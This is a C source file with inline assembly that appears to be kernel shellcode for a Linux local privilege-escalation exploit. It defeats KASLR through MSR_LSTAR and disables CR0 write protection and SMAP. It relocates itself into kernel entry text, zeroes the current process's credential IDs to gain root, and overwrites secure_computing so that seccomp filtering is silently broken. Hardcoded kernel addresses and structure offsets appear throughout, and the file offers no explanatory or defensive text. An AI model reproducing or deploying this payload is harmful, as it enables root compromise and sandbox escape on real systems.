#define X86_CR0_WP_BIT 16
#define X86_CR0_WP (1UL << X86_CR0_WP_BIT)
#define MSR_LSTAR 0xc0000082
#define PAGE_SHIFT 12
#define PTI_USER_PGTABLE_BIT PAGE_SHIFT
#define PTI_USER_PGTABLE_MASK (1 << PTI_USER_PGTABLE_BIT)
#define X86_CR3_PTI_PCID_USER_BIT 11
#define PTI_USER_PCID_BIT X86_CR3_PTI_PCID_USER_BIT
#define PTI_USER_PCID_MASK (1 << PTI_USER_PCID_BIT)
#define PTI_USER_PGTABLE_AND_PCID_MASK                                         \
  (PTI_USER_PCID_MASK | PTI_USER_PGTABLE_MASK)
#define GDT_ENTRY_KERNEL_DS 3
#define __KERNEL_DS (GDT_ENTRY_KERNEL_DS * 8)
#define entry_SYSCALL_64_nokaslr 0xFFFFFFFF81E00080
/* Filled with 0xcc. See __entry_text_end. */
#define entry_unused_nokaslr 0xFFFFFFFF81F04112
#define X86_CR4_SMAP_BIT 21
#define X86_CR4_SMAP (1UL << X86_CR4_SMAP_BIT)
#define SYSCALL_WORK_BIT_SECCOMP 0
#define SYSCALL_WORK_SECCOMP (1UL << SYSCALL_WORK_BIT_SECCOMP)
#define SECCOMP_MODE_DISABLED 0
#define offsetof_task_syscall_work 8
/* See prctl_get_seccomp(). */
#define offsetof_task_seccomp_mode 0xc68
#define secure_computing_nokaslr 0xFFFFFFFF81201860
#define init_cred_nokaslr 0xFFFFFFFF82C517C0
#define offsetof_task_cred 0xB88
#define offsetof_task_real_cred 0xb80
#define X86_EFLAGS_IF_BIT 9
#define offsetof_cred_uid 8
static void migrate_and_work(void);
static void work(unsigned long entry_SYSCALL_64);

__attribute__((section(".entry"))) void _start(void) {
  /* Hopefully the compiler did not generate a prologue. */
  asm volatile(/* Disable interrupts in order to avoid stack overflow. */
               "cli\n"
               "call migrate_and_work\n"
               /* Atomically restore interrupts and return. */
               "pop %%rax\n"
               "pop %%rdx\n"
               "pushfq\n"
               "orq %0,0(%%rsp)\n"
               "push %%rdx\n"
               "push %%rax\n"
               "iretq" ::"i"(1UL << X86_EFLAGS_IF_BIT));
  __builtin_trap();
}

extern char _end[];

static void __attribute__((used)) migrate_and_work(void) {
  /* Read entry_SYSCALL_64 address from MSR_LSTAR. */
  unsigned long low, high;
  asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(MSR_LSTAR));
  unsigned long entry_SYSCALL_64 = low | (high << 32);
  unsigned long entry_unused =
      entry_SYSCALL_64 - entry_SYSCALL_64_nokaslr + entry_unused_nokaslr;

  /* Turn off write protection. */
  unsigned long orig_cr0;
  asm volatile("mov %%cr0,%0" : "=r"(orig_cr0));
  unsigned long cr0 = orig_cr0 & ~X86_CR0_WP;
  asm volatile("mov %0,%%cr0" : : "r"(cr0));

  /* Turn off SMAP. */
  unsigned long orig_cr4;
  asm volatile("mov %%cr4,%0" : "=r"(orig_cr4));
  unsigned long cr4 = orig_cr4 & ~X86_CR4_SMAP;
  asm volatile("mov %0,%%cr4" : : "r"(cr4));

  /* Switch to user DS and ES. */
  unsigned long orig_ds;
  asm volatile("mov %%ds, %0" : "=r"(orig_ds));
  asm volatile("mov %0,%%ds\n" ::"r"(__KERNEL_DS));
  unsigned long orig_es;
  asm volatile("mov %%es, %0" : "=r"(orig_es));
  asm volatile("mov %0,%%es\n" ::"r"(__KERNEL_DS));

  /*
   * We are mapped no-execute in kernel page tables, see
   * __pti_set_user_pgtbl(). Example:
   *
   *     Kernel CR3 points to:
   *     0xffff888100f64000:    0x8000000102f8e067
   *
   *     User CR3 points to:
   *     0xffff888100f65000:    0x102f8e067
   *
   * Migrate to entry_unused, which is mapped for userspace.
   */
  unsigned long shellcode_size = (unsigned long)_end - (unsigned long)_start;
  __builtin_memcpy((void *)entry_unused, _start, shellcode_size);

  /* Call the relocated copy of work(). */
  void (*relocated_work)(unsigned long) =
      (void *)(entry_unused + ((unsigned long)work - (unsigned long)_start));
  relocated_work(entry_SYSCALL_64);

  /* Switch back to user DS and ES. */
  asm volatile("mov %0,%%ds" ::"r"(orig_ds));
  asm volatile("mov %0,%%es" ::"r"(orig_es));

  /* Restore SMAP. */
  asm volatile("mov %0,%%cr4" : : "r"(orig_cr4));

  /* Restore write protection. */
  asm volatile("mov %0,%%cr0" : : "r"(orig_cr0));
}

static void work(unsigned long entry_SYSCALL_64) {
  /* Switch to kernel page tables. */
  unsigned long orig_cr3;
  asm volatile("mov %%cr3,%0" : "=r"(orig_cr3));
  unsigned long cr3 = orig_cr3 & ~PTI_USER_PGTABLE_AND_PCID_MASK;
  asm volatile("mov %0,%%cr3" : : "r"(cr3));

  /* Switch to kernel GS. */
  asm volatile("swapgs");

  char *current;
  asm("mov %%gs:0x34940,%0" : "=r"(current));
  unsigned long cred = *(unsigned long *)(current + offsetof_task_cred);
  /* uid, guid, suid, sgid, euid, egid, fsuid, fsgid */
  __builtin_memset((void *)(cred + offsetof_cred_uid), 0, sizeof(int) * 8);
  if (0) {
    unsigned long init_cred =
        entry_SYSCALL_64 - entry_SYSCALL_64_nokaslr + init_cred_nokaslr;
    *(unsigned long *)(current + offsetof_task_cred) = init_cred;
    *(unsigned long *)(current + offsetof_task_real_cred) = init_cred;
  }
  if (0) {
    *(long *)(current + offsetof_task_syscall_work) &= ~SYSCALL_WORK_SECCOMP;
    *(int *)(current + offsetof_task_seccomp_mode) = SECCOMP_MODE_DISABLED;
  }
  unsigned long secure_computing =
      entry_SYSCALL_64 - entry_SYSCALL_64_nokaslr + secure_computing_nokaslr;
  /*
   * Silently break seccomp.
   *
   * 48 31 c0             	xor    %rax,%rax
   * c3                   	ret
   */
  *(unsigned int *)secure_computing = 0xc3c03148;

  /* Switch back to user GS. */
  asm volatile("swapgs");

  /* Switch back to user page tables. */
  asm volatile("mov %0,%%cr3" : : "r"(orig_cr3));
}